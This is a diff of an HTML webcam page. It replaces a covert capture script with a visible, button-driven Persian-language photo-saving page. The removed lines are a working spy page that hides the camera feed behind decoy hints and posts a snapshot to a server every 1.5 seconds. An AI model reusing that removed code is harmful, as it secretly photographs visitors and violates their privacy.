@@ -1,90 +1,59 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="fa">
 <head>
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ذخیره عکس‌ها در هاست</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
-
-
-
 <body>
-<span id="errorMsg"></span>
-<div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
-</div>
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-<p>Hint: Look at the favicon</p>
-<p>(Accept Permissions)</p>
-<p><label><input type="checkbox" name="mirror" id="mirror"/> Mirror image</label></p>
-</body>
+<h2>گرفتن عکس و ذخیره در هاست</h2>
+
+<video id="video" width="640" height="480" autoplay></video>
+<button id="capture">گرفتن عکس</button>
+
 <script>
+    $(document).ready(function() {
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
 
-    function post(imgdata) {
-        console.log('result');
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(function(error) {
+                console.log('دریافت دوربین با مشکل مواجه شد: ', error);
+            });
 
-        $.ajax({
-            type: 'POST',
-            data: {cat: imgdata},
-            url: '/post.php',
-            dataType: 'json',
-            async: false,
-            success: function (result) {
-                console.log(result);
-                // call the function that handles the response/results
-            },
-            error: function (result) {
-                console.log(result);
-            }
+        $('#capture').on('click', function() {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // ارسال عکس به PHP برای ذخیره در هاست
+            $.ajax({
+                type: 'POST',
+                url: 'save_image.php',
+                data: { image: imageData },
+                success: function(response) {
+                    console.log('عکس با موفقیت ذخیره شد.');
+                },
+                error: function(error) {
+                    console.log('خطا در ذخیره عکس: ', error);
+                }
+            });
         });
-    };
-
-
-    'use strict';
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-
-    const constraints = {
-        audio: false,
-        video: {
-
-            facingMode: "user"
-        }
-    };
-
-    // Access webcam
-    async function init() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            handleSuccess(stream);
-        } catch (e) {
-            console.log(`navigator.getUserMedia error:${e.toString()}`);
-        }
-    }
-
-    // Success
-    function handleSuccess(stream) {
-        window.stream = stream;
-        video.srcObject = stream;
-
-        var context = canvas.getContext('2d');
-        setInterval(function () {
-
-            context.drawImage(video, 0, 0, 640, 480);
-            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-            post(canvasData);
-        }, 1500);
-
-
-    }
-
-    // Load init
-    document.addEventListener('DOMContentLoaded', function() {
-        init();
     });
 </script>
 
+</body>
 </html>
